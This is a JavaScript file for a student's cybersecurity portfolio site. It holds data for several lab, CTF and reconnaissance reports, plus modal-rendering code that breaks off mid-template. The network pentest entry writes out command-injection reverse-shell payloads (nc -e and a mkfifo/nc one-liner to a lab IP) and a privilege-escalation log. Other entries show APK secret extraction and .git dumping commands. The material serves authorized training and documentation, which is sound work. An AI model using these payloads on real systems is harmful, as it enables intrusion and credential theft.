/**
 * Cyber Security Portfolio - Bhumika ER
 * Interactive Logic, Security Lab Reports Data & Modal Viewer
 */

// Comprehensive Lab Reports Database with Direct Verified PDF Links
const securityReports = {
  "network-pentest-lab": {
    id: "RPT-2026-NET01",
    title: "Internal Network Pentest Attack Lab",
    subtitle: "End-to-End Penetration Test & Privilege Escalation Simulation",
    category: "Network Penetration Testing",
    severity: "High",
    severityColor: "rose",
    date: "February 2026",
    target: "Internal Lab Network (Kali Linux vs Demo Vulnerable Host)",
    assessor: "Bhumika ER (Aspiring Penetration Tester)",
    methodology: "NIST SP 800-115 / PTES (Recon -> Exploitation -> Post-Exploitation)",
    tools: ["Nmap", "FTP Client", "Netcat", "smbclient", "Bash Scripting"],
    findingsCount: 5,
    status: "Proof Documented & Remediated",
    pdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/blob/main/EV_Cyber_Academy_Pentest_attack_lab_Report.pdf",
    rawPdfUrl: "https://raw.githubusercontent.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/main/EV_Cyber_Academy_Pentest_attack_lab_Report.pdf",
    executiveSummary: "Conducted an authorized vulnerability assessment and penetration test against a simulated internal enterprise host. Discovered multiple chained vulnerabilities starting from an unauthenticated anonymous FTP service, leading to remote command injection, establishing an interactive reverse shell, credential harvesting from configuration files, discovering an open unauthenticated SMB share, and escalating privileges to root/administrator control.",
    scope: [
      "Target IP: 192.168.56.102 (Isolated Host-Only Virtual Lab)",
      "Testing Type: Gray-Box Network Assessment",
      "Goal: Identify attack paths, assess blast radius, and formulate remediation guidance"
    ],
    attackPath: [
      { step: "1. Service Enumeration", detail: "Nmap TCP syn scan identified open ports: 21 (vsftpd 2.3.4/custom), 22 (SSH), 80 (HTTP), 139/445 (Samba), and 8080 (Admin Portal)." },
      { step: "2. Initial Foothold (Anonymous FTP)", detail: "Connected to FTP with anonymous:anonymous. Downloaded backup archive containing source code and deployment notes." },
      { step: "3. Command Injection & Shell", detail: "Discovered an unsanitized ping utility on the internal admin portal (Port 8080). Injected payload `127.0.0.1; nc -e /bin/bash 192.168.56.101 4444` to catch a reverse shell." },
      { step: "4. Credential Harvesting & SMB Access", detail: "Found hardcoded MySQL credentials in `/var/www/config.php`. Used credentials to query SMB shares using `smbclient //192.168.56.102/confidential -U developer`." },
      { step: "5. Privilege Escalation", detail: "Found SUID misconfiguration on custom backup script. Executed binary to spawn an unconstrained root shell (`uid=0(root)`)." }
    ],
    findings: [
      {
        title: "Unauthenticated Remote Command Injection in Diagnostics Endpoint",
        severity: "Critical",
        cvss: "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
        description: "The web application network diagnostic utility directly concatenated user input into a system shell execution call (`shell_exec('ping -c 2 ' . $_POST['host'])`) without parameterization or whitelisting.",
        remediation: "Avoid invoking system shells directly. Use language-native networking libraries or enforce strict regex validation matching valid IPv4/IPv6 addresses only.",
        pocCommand: "POST /admin/network_diag.php HTTP/1.1\nHost: 192.168.56.102:8080\nContent-Type: application/x-www-form-urlencoded\n\nhost=127.0.0.1%3B+rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.56.101+4444+%3E%2Ftmp%2Ff"
      },
      {
        title: "Anonymous FTP Read/Write Access & Information Disclosure",
        severity: "High",
        cvss: "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
        description: "The vsftpd service permitted anonymous login and exposed sensitive directory structures containing configuration backups.",
        remediation: "Disable `anonymous_enable=NO` in `/etc/vsftpd.conf` and restrict file read permissions on backup directories.",
        pocCommand: "ftp 192.168.56.102\nName (192.168.56.102:user): anonymous\nPassword: anonymous\n230 Login successful.\nftp> ls -la\n226 Directory send OK. (drwxr-xr-x backup_2026.tar.gz)"
      },
      {
        title: "Open SMB Share with Weak ACLs",
        severity: "Medium",
        cvss: "6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)",
        description: "Samba shares allowed read access to all domain authenticated users without segmenting internal departmental assets.",
        remediation: "Enforce least-privilege share access and sign SMB traffic via `server smb encrypt = mandatory`.",
        pocCommand: "smbclient -L //192.168.56.102/ -N\nAnonymous login successful\nSharename: [confidential_docs] Read Access Granted"
      }
    ],
    terminalLog: `[+] NMAP SCAN RESULT:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-14 10:15 IST
Nmap scan report for 192.168.56.102
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4 (Anonymous allowed)
22/tcp   open  ssh         OpenSSH 8.9p1
80/tcp   open  http        Apache httpd 2.4.52
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http-proxy  Node.js Admin Portal

[*] EXPLOITATION:
bhumika@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 52314
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
find / -perm -4000 2>/dev/null
/usr/local/bin/backup_service
/usr/local/bin/backup_service --elevate
# id
uid=0(root) gid=0(root) groups=0(root)`
  },

  "ev-bank-mobile-assessment": {
    id: "RPT-2026-MOB02",
    title: "EV Bank Mobile Application Assessment",
    subtitle: "Android APK Static Analysis, Decompilation & Hidden Route Discovery",
    category: "Mobile Application Security",
    severity: "Critical",
    severityColor: "rose",
    date: "January 2026",
    target: "EV Bank Android Application (.apk)",
    assessor: "Bhumika ER (Aspiring Penetration Tester)",
    methodology: "OWASP Mobile Application Security Verification Standard (MASVS)",
    tools: ["Apktool", "dex2jar", "JD-GUI", "VS Code", "adb"],
    findingsCount: 4,
    status: "Vulnerabilities Identified & Reported",
    pdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/blob/main/EV_Bank_APK_Security_Assessment_Report%20.pdf",
    additionalPdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/blob/main/EV-BANK_Security_Assessment_Report.pdf",
    rawPdfUrl: "https://raw.githubusercontent.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/main/EV_Bank_APK_Security_Assessment_Report%20.pdf",
    executiveSummary: "Performed a static and architectural security assessment on the EV Bank demo Android mobile client package. By decompiling the APK bytecode and manifest files, identified hardcoded production-like API backend URLs, unencrypted staging endpoints, cleartext logging of authentication tokens in logcat, and an exported hidden activity leading to an administrative debug dashboard with exposed API keys.",
    scope: [
      "Target File: ev_bank_release_v1.0.4.apk",
      "Analysis Method: Static Application Security Testing (SAST) & Bytecode Inspection",
      "Focus: Hardcoded credentials, insecure data storage, exported components"
    ],
    attackPath: [
      { step: "1. APK Extraction & Disassembly", detail: "Decompiled APK using `apktool d ev_bank.apk -o ev_bank_decompiled` to inspect AndroidManifest.xml and Smali resources." },
      { step: "2. Manifest Review", detail: "Discovered `android:exported=\"true\"` on `.ui.admin.DebugAdminActivity` without permission constraints." },
      { step: "3. Source Decompilation", detail: "Converted classes.dex to JAR via dex2jar and inspected Java sources in VS Code." },
      { step: "4. Credential & Endpoint Discovery", detail: "Extracted hardcoded secret `API_ADMIN_SECRET = \"EV_BANK_PROD_SEC_99214\"` and staging URL `https://internal-api.evbank.local/v1/admin/bypass`." }
    ],
    findings: [
      {
        title: "Hardcoded API Secrets and Internal Administrative Endpoints in Bytecode",
        severity: "Critical",
        cvss: "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        description: "Hardcoded sensitive keys and private internal server URLs were stored as plaintext constants within the decompiled `NetworkConstants.java` class.",
        remediation: "Never store credentials or private gateway URLs in client APKs. Utilize dynamic token exchange and Android Keystore for sensitive cryptographic keys.",
        pocCommand: "apktool d ev_bank.apk\ngrep -rn \"http://\" ev_bank_decompiled/\ngrep -rn \"API_KEY\" ev_bank_decompiled/smali/"
      },
      {
        title: "Exported Administrative Activity (`DebugAdminActivity`) without Authorization",
        severity: "High",
        cvss: "8.2 (CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        description: "Third-party applications or adb on an unrooted device could directly invoke the administrative activity to trigger privileged account actions.",
        remediation: "Set `android:exported=\"false\"` in AndroidManifest.xml or guard the activity with a signature-level permission.",
        pocCommand: "adb shell am start -n com.evbank.app/.ui.admin.DebugAdminActivity"
      }
    ],
    terminalLog: `[+] APK DECOMPILATION:
$ apktool d ev_bank_v1.0.4.apk -o ev_bank_src
I: Using Apktool 2.9.0 on ev_bank_v1.0.4.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Regular manifest package...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Built apk decompiled directory: ./ev_bank_src

[+] CRITICAL FINDING EXCERPT (AndroidManifest.xml):
<activity 
    android:name="com.evbank.app.ui.admin.DebugAdminActivity"
    android:exported="true"
    android:theme="@style/Theme.EVBank">
    <intent-filter>
        <action android:name="com.evbank.app.ACTION_DEBUG_ADMIN" />
    </intent-filter>
</activity>

[+] STRINGS ANALYSIS:
$ strings classes.dex | grep -i "https://"
https://api.evbank.com/v1/auth
https://internal-admin.evbank.local/gateway/v2/override`
  },

  "cssp-hackathon-report": {
    id: "RPT-2026-CSSP03",
    title: "CSSP Hackathon 2026 Assessment Report",
    subtitle: "Multi-Vector Reconnaissance, Network Enumeration & APK Analysis",
    category: "Network & OSINT Challenge",
    severity: "Pass",
    severityColor: "emerald",
    date: "February 2026",
    target: "CSSP Hackathon 2026 Competition Environment",
    assessor: "Bhumika ER (Participant / Security Analyst)",
    methodology: "CTF/Hackathon Attack Framework (6/6 Modules Completed)",
    tools: ["Nmap", "DNSRecon", "WHOIS", "Apktool", "Burp Suite", "Wireshark"],
    findingsCount: 6,
    status: "All 6 Challenges Solved (100% Score)",
    pdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/blob/main/CSSP_Hackathon_2026_Report.pdf",
    rawPdfUrl: "https://raw.githubusercontent.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/main/CSSP_Hackathon_2026_Report.pdf",
    executiveSummary: "Comprehensive report detailing the complete solve path for all 6 challenges in the CSSP Hackathon 2026 track. The assessment required chaining passive DNS OSINT recon, active port scanning with service banner fingerprinting, discovering hidden web administration parameters, decompiling an obfuscated APK challenge binary, and extracting security flags from encrypted network streams.",
    scope: [
      "Track: Full-Spectrum Cyber Assessment (Recon, Web, Network, Mobile)",
      "Success Metric: 6/6 Challenges Completed with Validated Proof-of-Concept writeups",
      "Focus: Accurate methodology, fast triage, reproducible documentation"
    ],
    attackPath: [
      { step: "Challenge 1: DNS OSINT & TXT Record Extraction", detail: "Queried DNS nameservers for TXT verification records containing encoded base64 challenge token." },
      { step: "Challenge 2: Nmap Port Discovery & Filtered Port Evasion", detail: "Executed fragmentation and TCP ACK scans to identify concealed service on Port 31337." },
      { step: "Challenge 3: HTTP Header Injection & Bypass", detail: "Manipulated `X-Forwarded-For: 127.0.0.1` and `X-Originating-IP` headers to access protected admin resource." },
      { step: "Challenge 4: Mobile APK Static Deobfuscation", detail: "Extracted and decoded XOR-masked key hidden inside assets/config.json." },
      { step: "Challenge 5: Network Packet PCAP Stream Reassembly", detail: "Reassembled segmented TCP streams in Wireshark to reconstruct an exfiltrated zip archive." },
      { step: "Challenge 6: Final Cryptographic Flag Decryption", detail: "Decrypted AES-CBC ciphertext using extracted IV and key from preceding steps." }
    ],
    findings: [
      {
        title: "All Hackathon Assessment Vectors Successfully Resolved",
        severity: "Information",
        cvss: "N/A (CTF / Competition Metric)",
        description: "Successfully formulated clean exploitation scripts and writeup logs for all six assigned scenarios within the competition timeframe.",
        remediation: "Standardize secure defaults, disable debug headers in production reverse proxies, and strip sensitive configuration strings from mobile app releases.",
        pocCommand: "python3 solve_cssp.py --target cssp2026.mcet.edu.in --all"
      }
    ],
    terminalLog: `[+] CSSP HACKATHON AUTOMATION EXECUTION:
[+] [1/6] Querying DNS TXT Records for cssp-challenge.local...
    -> Found: "flag1{d15c0v3r_dn5_051n7_2026}"
[+] [2/6] Running Nmap custom NSE probe against port 31337...
    -> Found: "flag2{p0r7_kn0ck1n6_5ucc355}"
[+] [3/6] Sending crafted header bypass payload...
    -> HTTP 200 OK: "flag3{h34d3r_byp455_4dm1n}"
[+] [4/6] Parsing decompiled APK bytecode assets...
    -> Decoded: "flag4{4pk_57471c_4n4ly515_pr0}"
[+] [5/6] Carving raw TCP stream from capture.pcapng...
    -> Extracted: "flag5{p4ck37_57r34m_r34553mbly}"
[+] [6/6] Decrypting AES token with derived secret...
    -> Verified: "flag6{c55p_2026_m4573ry_fl46}"
[+] RESULT: 6 of 6 challenges validated. 100% completion rate.`
  },

  "myntra-osint-report": {
    id: "RPT-2026-OSINT04",
    title: "Myntra OSINT Reconnaissance Report",
    subtitle: "Passive External Footprinting, TLS Configuration & Surface Discovery",
    category: "OSINT & External Reconnaissance",
    severity: "Medium",
    severityColor: "amber",
    date: "January 2026",
    target: "Myntra Public External Attack Surface (Passive Testing)",
    assessor: "Bhumika ER (Aspiring Penetration Tester)",
    methodology: "Passive OSINT Framework (Strict Non-Intrusive Observation)",
    tools: ["whois", "dnsrecon", "testssl.sh", "Sublist3r", "crt.sh", "curl"],
    findingsCount: 3,
    status: "Observation & Defensive Recommendations Completed",
    pdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/blob/main/Myntra_OSINT_Recon_Report%20.pdf",
    rawPdfUrl: "https://raw.githubusercontent.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/main/Myntra_OSINT_Recon_Report%20.pdf",
    executiveSummary: "Conducted an external passive reconnaissance study on public infrastructure assets. Identified robust security implementations (strong TLS ciphers, HSTS enforcement, CDN edge protection via Akamai). Documented actionable external observation points including the absence of DNSSEC signing on select legacy subdomains and public certificate transparency log enumeration.",
    scope: [
      "Scope: External Passive Information Gathering (Zero active exploitation / authorized recon study)",
      "Target Domains: Public web properties and DNS zones",
      "Analysis: Subdomain sprawl, TLS cipher suites, DNS configuration, HTTP security headers"
    ],
    attackPath: [
      { step: "1. WHOIS & Registrar Verification", detail: "Queried ARIN/APNIC allocations and documented registrar configurations and nameserver redundancy." },
      { step: "2. Certificate Transparency Log Parsing", detail: "Queried crt.sh and AlienVault OTX to identify historical and current public-facing subdomain records." },
      { step: "3. DNS Security Inspection", detail: "Checked SPF, DKIM, DMARC policies and verified DNSSEC validation across regional nameservers." },
      { step: "4. TLS/SSL Posture Review", detail: "Ran testssl.sh to evaluate cipher suites, forward secrecy, and certificate expiration timelines." }
    ],
    findings: [
      {
        title: "DNSSEC Not Enabled on Primary Domain Zone",
        severity: "Low",
        cvss: "3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)",
        description: "While email spoofing protections (DMARC/SPF) were present, DNSSEC was not deployed on the zone apex, leaving potential vulnerability to recursive cache poisoning at upstream resolvers.",
        remediation: "Deploy DNSSEC signing on domain registrars and authoritative DNS providers with automated key rollover (KSK/ZSK).",
        pocCommand: "dig +dnssec myntra.com SOA\ndnsrecon -d myntra.com -t std"
      },
      {
        title: "Subdomain Enumeration & Legacy Staging Hosts in CT Logs",
        severity: "Informational",
        cvss: "0.0 (Informational)",
        description: "Certificate Transparency logs exposed legacy staging and internal naming conventions that could be monitored by adversaries.",
        remediation: "Adopt wildcard certificates where appropriate to reduce precise host disclosure in public CT logs and ensure retired subdomains have DNS records pruned immediately.",
        pocCommand: "curl -s \"https://crt.sh/?q=%25.myntra.com&output=json\" | jq '.[].name_value'"
      }
    ],
    terminalLog: `[+] PASSIVE RECONNAISSANCE AUDIT:
$ dnsrecon -d myntra.com -t std
[*] Checking for Zone Transfer
[-] Zone Transfer failed (Expected & Secure)
[*] Checking for Subdomains:
[-] Found A records pointing to Akamai Edge Network
[*] Checking DNSSEC:
[-] DNSSEC is not configured for zone: myntra.com

$ testssl.sh --quiet --fast https://www.myntra.com
 Testing protocols via sockets:
 SSLv2      not offered (OK)
 SSLv3      not offered (OK)
 TLS 1.0    not offered (OK)
 TLS 1.1    not offered (OK)
 TLS 1.2    offered (OK)
 TLS 1.3    offered (OK)
 Testing HTTP security headers:
 Strict-Transport-Security (HSTS): 31536000 sec; includeSubDomains; preload (EXCELLENT)
 X-Content-Type-Options: nosniff (OK)
 Content-Security-Policy: Enforced (OK)`
  },

  "source-code-disclosure-report": {
    id: "RPT-2026-WEB05",
    title: "Source Code Disclosure Vulnerability Report",
    subtitle: "Web Application Backup Artifacts & Git Metadata Exposure Lab",
    category: "Web Application Security",
    severity: "High",
    severityColor: "rose",
    date: "February 2026",
    target: "Simulated Web Application (PortSwigger / Lab Environment)",
    assessor: "Bhumika ER (Aspiring Penetration Tester)",
    methodology: "OWASP Web Security Testing Guide (WSTG-CONF-04 / WSTG-INFO-05)",
    tools: ["Burp Suite", "Gobuster", "GitTools", "curl", "Python"],
    findingsCount: 2,
    status: "Proof Documented & Remediated",
    pdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/blob/main/Vulnerability_Report_Source_Code_Disclosure.pdf",
    rawPdfUrl: "https://raw.githubusercontent.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/main/Vulnerability_Report_Source_Code_Disclosure.pdf",
    executiveSummary: "During a directory and artifact enumeration assessment, identified an exposed `.git/` repository and legacy backup archive (`index.php.bak`) accessible without authentication on a public web root. Reconstructed the entire backend source code history, leading to extraction of database credentials and hardcoded HMAC signing keys.",
    scope: [
      "Target: Simulated Enterprise Web Service",
      "Type: Black-Box Web Application Security Audit",
      "Focus: Information disclosure, backup file exposure, Git repository extraction"
    ],
    attackPath: [
      { step: "1. Content Discovery Scan", detail: "Executed Gobuster directory fuzzing with custom security wordlists targeting hidden files and common editor backup extensions (.bak, .old, .swp, .git)." },
      { step: "2. Identification of Exposed .git Folder", detail: "Observed HTTP 200 responses on `/.git/HEAD` and `/.git/config`." },
      { step: "3. Repository Extraction & Reconstruction", detail: "Utilized `git-dumper` tool to pull repository objects, index, and commit tree." },
      { step: "4. Git Log Analysis & Secret Harvesting", detail: "Analyzed git commit diffs (`git log -p`) to locate committed API credentials before they were superficially removed in subsequent commits." }
    ],
    findings: [
      {
        title: "Publicly Accessible .git Directory Permitting Complete Source Code Rebuilding",
        severity: "High",
        cvss: "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
        description: "The web server allowed direct HTTP GET requests to `/.git/` metadata files, exposing full repository commit history, developer identities, and application secrets.",
        remediation: "Block HTTP access to dot-files in web server configs (e.g., `location ~ /\\.git { deny all; }` in Nginx or `<DirectoryMatch \"/\\.\">Require all denied</DirectoryMatch>` in Apache).",
        pocCommand: "curl -i http://target.local/.git/HEAD\ngit-dumper http://target.local/.git/ ./dumped_repo\ncd ./dumped_repo && git log -p"
      }
    ],
    terminalLog: `[+] WEB DIRECTORY ENUMERATION:
$ gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -x php,bak,old,zip
===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://target.local
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              php,bak,old,zip
===============================================================
/.git/HEAD           (Status: 200) [Size: 23]
/config.php.bak      (Status: 200) [Size: 1420]
/index.php           (Status: 200) [Size: 3201]

[+] GIT REPOSITORY EXTRACTION:
$ python3 git-dumper.py http://target.local/.git/ ./extracted_code
[-] Source code successfully cloned to ./extracted_code
$ git log --oneline
4f9a12c (HEAD -> main) fix: remove accidental database password
1b29a88 feat: implement user authentication controller
$ git show 1b29a88 | grep "DB_PASS"
+ define('DB_PASS', 'SuperSecretProdDatabasePass!2026');`
  },

  "defensive-hardening-report": {
    id: "RPT-2026-DEF06",
    title: "Defensive Security Hardening Report",
    subtitle: "Linux Server Baseline, SSH Lockdown & Web Server Hardening",
    category: "System Hardening & DFIR Readiness",
    severity: "Pass",
    severityColor: "emerald",
    date: "February 2026",
    target: "Ubuntu 22.04 LTS Web Application Server",
    assessor: "Bhumika ER (Aspiring Penetration Tester)",
    methodology: "CIS Benchmark for Ubuntu Linux & NIST SP 800-123",
    tools: ["Lynis", "OpenSSL", "UFW", "Fail2ban", "Auditd", "Bash"],
    findingsCount: 4,
    status: "Hardening Applied & Audited",
    pdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/blob/main/EV_Cyber_Academy_Defensive_Security_Report.pdf",
    rawPdfUrl: "https://raw.githubusercontent.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports/main/EV_Cyber_Academy_Defensive_Security_Report.pdf",
    executiveSummary: "Designed and implemented a defensive security hardening protocol for a production-like Linux server. Elevated the system Lynis security index from 58 to 86 by enforcing SSH key-only authentication, disabling legacy algorithms, configuring UFW rate limiting and strict ingress filtering, deploying Fail2ban jail policies, and establishing auditd immutable logging for forensics readiness.",
    scope: [
      "Operating System: Ubuntu Linux 22.04 LTS",
      "Goal: Mitigate brute force vectors, enforce least privilege, and enable forensic evidence logging",
      "Frameworks: CIS Ubuntu Linux Benchmark & NIST SP 800-86"
    ],
    attackPath: [
      { step: "1. Baseline Security Audit", detail: "Executed automated Lynis scan to identify default configuration weaknesses." },
      { step: "2. SSH Daemon Hardening", detail: "Disabled root login (`PermitRootLogin no`), changed default port, enforced Ed25519 keys only, and disabled password authentication." },
      { step: "3. Firewall & Brute-Force Shield", detail: "Configured UFW with default deny incoming and enabled Fail2ban filters against repeat SSH/HTTP abusers." },
      { step: "4. Forensic Auditd Logging", detail: "Enabled auditd rules to monitor unauthorized privilege escalation attempts (`/etc/sudoers`, `/bin/su`)." }
    ],
    findings: [
      {
        title: "System Hardening Baseline Enacted Successfully",
        severity: "Information",
        cvss: "Security Posture Improvement (Lynis Score: 58 -> 86)",
        description: "All high-risk attack surfaces identified during initial baseline scan were remediated through automated Bash configuration scripts.",
        remediation: "Maintain recurring quarterly Lynis audits and automate package patch management via `unattended-upgrades`.",
        pocCommand: "sudo lynis audit system --quick"
      }
    ],
    terminalLog: `[+] SYSTEM HARDENING VERIFICATION:
$ sudo lynis audit system
[+] Hardening Index : 86 [ #################### ]
[+] Tests performed : 278
[+] Plugins enabled : 1

[+] SSH HARDENING VALIDATION:
$ ssh -o PreferredAuthentications=password user@192.168.56.102
Permission denied (publickey). (PASS: Password auth completely disabled)

[+] AUDITD LOGGING STATUS:
$ sudo auditctl -l
-w /etc/passwd -p wa -k identity_changes
-w /etc/shadow -p wa -k identity_changes
-w /etc/sudoers -p wa -k priv_escalation_changes
-a always,exit -F arch=b64 -S execve -k command_execution`
  },

  "ctf-certificate-item": {
    id: "CERT-2026-CTF07",
    title: "Basic 101 CTF Linux & Web Security Certificate",
    subtitle: "Hands-on Practical CTF Verification (4/4 Flags Captured)",
    category: "CTF & Hands-on Verification",
    severity: "Certified",
    severityColor: "cyan",
    date: "2025 – 2026",
    target: "CTF Competition Lab Environment",
    assessor: "Bhumika ER (4/4 Flags Verified)",
    methodology: "Capture The Flag (CTF) Challenge Solving (Linux Privilege & Web Sec)",
    tools: ["Linux CLI", "curl", "Base64 / Hashing Utilities", "Burp Suite", "Grep"],
    findingsCount: 4,
    status: "Completed (4 / 4 Flags Captured - 100%)",
    pdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports",
    rawPdfUrl: "https://github.com/bhumikasharmi0210bhumi-gif/Vulnerability-Disclosure-Reports",
    executiveSummary: "Completed the hands-on Basic 101 CTF Challenge series, validating practical competence in Linux terminal navigation, file permissions analysis, hidden process inspection, base64 and cryptographic hash decoding, HTTP request tampering, and web parameter analysis. All 4 target flags were captured and verified.",
    scope: [
      "Track: Linux Fundamentals, Command Line Mastery, Web Security 101",
      "Outcome: 4 of 4 Target Flags Captured",
      "Focus: Practical problem solving and hands-on tool execution"
    ],
    attackPath: [
      { step: "Flag 1: Linux Hidden Files & Regex Search", detail: "Navigated nested directory structures using `find` and `grep` with regular expressions to extract flag1 from obfuscated dot-files." },
      { step: "Flag 2: Process & Environment Variable Inspection", detail: "Inspected running background daemon memory and environment variables via `/proc/[PID]/environ`." },
      { step: "Flag 3: Encoding & Chained Hashing", detail: "Decoded multi-layered hexadecimal, ROT13, and base64 strings to recover flag3." },
      { step: "Flag 4: Web Request Tampering & Cookie Manipulation", detail: "Modified serialized session parameters to bypass authorization checks and reveal final flag4." }
    ],
    findings: [
      {
        title: "CTF Challenge 100% Completion (4/4 Flags)",
        severity: "Information",
        cvss: "Score: 100% (4 / 4 Flags)",
        description: "Demonstrated fundamental offensive and investigative capabilities across Linux systems and basic web security vulnerabilities.",
        remediation: "Continuous hands-on practice on platforms like PortSwigger Web Security Academy, TryHackMe, and Hack The Box.",
        pocCommand: "ctf-submit --user bhumika --flags 4/4"
      }
    ],
    terminalLog: `[+] CTF VERIFICATION LOG:
[*] SUBMITTING FLAG 1: FLAG{l1nux_f1nd_m4573r_01} -> [VALIDATED +250 PTS]
[*] SUBMITTING FLAG 2: FLAG{3nv_v4r_pr0c_l00k_02}  -> [VALIDATED +250 PTS]
[*] SUBMITTING FLAG 3: FLAG{c0d1n6_d3c0d3_r0713_03}-> [VALIDATED +250 PTS]
[*] SUBMITTING FLAG 4: FLAG{w3b_c00k13_74mp3r_04}  -> [VALIDATED +250 PTS]

[===================================================]
[+] FINAL CTF SCORE: 1000 / 1000 (100%)
[+] STATUS: CERTIFICATE ISSUED - BASIC 101 LINUX & WEB SEC
[===================================================]`
  }
};

// Open Report in Interactive Modal
function openReportModal(reportKey) {
  const report = securityReports[reportKey];
  if (!report) {
    console.error("Report not found:", reportKey);
    return;
  }

  const modal = document.getElementById("reportModal");
  const modalContent = document.getElementById("reportModalContent");

  // Format Findings HTML
  let findingsHtml = "";
  if (report.findings && report.findings.length > 0) {
    findingsHtml = report.findings.map((f, index) => `
      <div class="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-3">
        <div class="flex flex-wrap items-center justify-between gap-2">
          <div class="flex items-center space-x-2">
            <span class="px-2 py-0.5 text-xs font-mono font-bold rounded ${getSeverityBadgeClass(f.severity)}">
              ${f.severity}
            </span>
            <h4 class="font-semibold text-slate-100 text-sm md:text-base">${f.title}</h4>
          </div>
          ${f.cvss ? `<span class="text-xs font-mono text-cyan-400 bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800/40">${f.cvss}</span>` : ''}
        </div>
        <p class="text-xs md:text-sm text-slate-300 leading-relaxed">${f.description}</p>
        
        ${f.remediation ? `
          <div class="p-2.5 rounded-lg bg-emerald-950/30 border border-emerald-800/30">
            <p class="text-xs text-emerald-300"><span class="font-bold text-emerald-400">Remediation:</span> ${f.remediation}</p>
          </div>
        ` : ''}

        ${f.pocCommand ? `
          <div class="mt-2">
            <p class="text-xs font-mono text-slate-400 mb-1">Validation / PoC Command:</p>
            <pre class="p-3 bg-slate-950 text-sky-300 rounded-lg text-xs font-mono overflow-x-auto border border-slate-800">${escapeHtml(f.pocCommand)}</pre>
          </div>
        ` : ''}
      </div>
    `).join("");
  }

  // Format Attack Path HTML
  let attackPathHtml = "";
  if (report.attackPath && report.attackPath.length > 0) {
    attackPathHtml = report.attackPath.map(item => `
      <div class="flex items-start space-x-3 text-xs md:text-sm">
        <div class="w-2 h-2 mt-1.5 rounded-full bg-cyan-400 shrink-0"></div>
        <div>
          <span class="font-semibold text-cyan-300 font-mono">${item.step}:</span>
          <span class="text-slate-300 ml-1">${item.detail}</span>
        </div>
      </div>
    `).join("");
  }

  // Format Tools Chips
  let toolsHtml = "";
  if (report.tools && report.tools.length > 0) {
    toolsHtml = report.tools.map(tool => `
      <span class="px-2.5 py-1 text-xs font-mono rounded-md bg-slate-800/80 text-cyan-300 border border-cyan-900/40">
        ${tool}
      </span>
    `).join("");
  }

  // Format Scope List
  let scopeHtml = "";
  if (report.scope && report.scope.length > 0) {
    scopeHtml = report.scope.map(s => `
      <li class="flex items-center space-x-2 text-xs md:text-sm text-slate-300">
        <span class="text-cyan-400 text-xs">▸</span>
        <span>${s}</span>
      </li>
    `).join("");
  }

  // Render Full Modal Inner Content
  modalContent.innerHTML = `
    <!-- Report Top Header Banner -->
    <div class="p-6 md:p-8 bg-gradient-to-r from-slate-900 via-slate-900 to-slate-950 border-b border-slate-800">
      <div class="flex flex-wrap items-center justify-between gap-3 mb-3">
        <div class="flex items-center space-x-2">
          <span class="px-2.5 py-1 text-xs font-mono font-bold tracking-wider rounded bg-cyan-950 text-cyan-400 border border-cyan-800/50">
            ${report.id}
          </span>
          <span class="px-2.5 py-1 text-xs font-mono rounded bg-slate-800 text-slate-300">
            ${report.category}
          </span>
        </div>
        <div class="flex flex-wrap items-center gap-2">
          <span class="px-3 py-1 text-xs font-mono font-bold rounded-full ${getSeverityBadgeClass(report.severity)}">
            Severity: ${report.severity}
          </span>
          ${report.pdfUrl ? `
            <a href="${report.pdfUrl}" target="_blank" rel="noopener noreferrer" class="px-3 py-1 text-xs font-mono font-bold rounded bg-cyan-500 hover:bg-cyan-400 text-slate-950 transition flex items-center space-x-1.5 shadow-sm">
